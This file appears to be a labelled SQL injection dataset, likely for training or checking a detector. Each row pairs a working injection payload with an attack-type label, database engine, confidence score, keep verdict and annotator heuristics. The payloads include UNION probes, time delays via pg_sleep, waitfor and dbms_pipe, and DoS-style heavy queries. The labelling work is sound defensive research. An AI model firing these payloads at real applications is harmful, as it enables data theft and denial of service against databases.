payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-2225' union all select 1545,1545,1545,1545#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1010,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2225' union all select 1545,1545,1545,1545#"
"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1011,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1%"" ) ) and make_set ( 9897 = 5557,5557 ) and ( ( ""%"" = """,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1012,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1%"" ) ) and make_set ( 9897 = 5557,5557 ) and ( ( ""%"" = """
"1%' union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1013,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' union all select null,null,null,null,null,null,null--"
-8410' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1014,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8410' ) ) ) or 8571 = 8571--
"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1015,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""zgoy"" like ""zgoy"
-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.8,IN with char for blind,KEEP,,boolean_blind,generic,1016,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1017,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1'+ ( select ttae where 4601 = 4601 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) +'"
1 where 4844 = 4844,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1018,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 4844 = 4844
"1' union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1019,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' union all select null,null,null,null#"
"1%' ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1020,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) union all select null,null,null,null,null,null,null,null,null--"
"1'|| ( select 'ozki' where 4435 = 4435 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1021,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'|| ( select 'ozki' where 4435 = 4435 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) ||'"
"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""aixs"" = ""aixs",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1022,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""aixs"" = ""aixs"
1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) -- ybmz,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1023,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) -- ybmz
-5982' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ikuh' = 'ikuh,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1024,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-5982' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'ikuh' = 'ikuh
"1"" where 3764 = 3764",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1025,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 3764 = 3764"
-6144' ) or 9385 = 2474--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1026,boolean_blind,generic,Pattern match: 'or 9385 = 2474' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6144' ) or 9385 = 2474--
1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1027,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) as qgyz where 1547 = 1547 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
"1%' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and '%' = '",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1028,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and '%' = '"
"select sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1029,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"select sleep ( 5 ) and ( ( ( ""%"" = """
"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1030,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select rwse where 9843 = 9843 union all select null,null,null,null,null,null,null--"
-7209' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'stqx' = 'stqx,boolean_blind,postgresql,0.8,CAST for PostgreSQL blind,KEEP,,boolean_blind,postgresql,1031,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,-7209' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'stqx' = 'stqx
"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1032,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""hgds"" like ""hgds",time_blind,mysql,0.9,benchmark() for time blind,KEEP,,time_blind,mysql,1033,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""hgds"" like ""hgds"
"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1034,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --"
1' ) where 3572 = 3572,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1035,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 3572 = 3572
"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1036,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 where 3478 = 3478 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --"
"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr",time_blind,mssql,0.9,waitfor delay for MSSQL time blind,KEEP,,time_blind,mssql,1037,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,"1"" waitfor delay '0:0:5' and ""dvfr"" like ""dvfr"
"-2715' ) ) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1038,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2715' ) ) union all select 8646,8646,8646,8646,8646,8646,8646,8646--"
1' where 8128 = 8128,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1039,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 8128 = 8128
"1 ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1040,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1041,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )"
"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1042,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1%"" ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --"
"-2748' ) ) as gazw where 4624 = 4624 union all select 4624,4624#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1043,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2748' ) ) as gazw where 4624 = 4624 union all select 4624,4624#"
"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1044,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" where 9804 = 9804 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1045,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) as fkgs where 5948 = 5948 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1046,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1%' and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '"
"1' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1047,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --"
1%' ) ) ) and 1661 = 7683,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1048,boolean_blind,generic,Pattern match: 'and 1661 = 7683' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) ) ) and 1661 = 7683
"1' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1049,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --"
"1' ) as vpop where 2528 = 2528 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1050,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as vpop where 2528 = 2528 union all select null,null,null,null,null,null,null#"
"-5903%"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1051,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5903%"" ) ) ) or 3038 = 3038"
select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.8,CASE WHEN for MSSQL blind,KEEP,,boolean_blind,mssql,1052,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 4572 = 4086 ) then 1 else 4572* ( select 4572 from master..sysdatabases ) end ) --
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1053,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'tmwy' = 'tmwy"
"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""vcjt"" like ""vcjt",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1054,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""vcjt"" like ""vcjt"
"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )",time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1055,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) )"
"-4980"" or ( 8459 = 8459 ) *4906 and ""mnlj"" like ""mnlj",boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1056,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-4980"" or ( 8459 = 8459 ) *4906 and ""mnlj"" like ""mnlj"
"-2044%' ) ) or elt ( 9299 = 3618,3618 ) and ( ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1057,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-2044%' ) ) or elt ( 9299 = 3618,3618 ) and ( ( '%' = '"
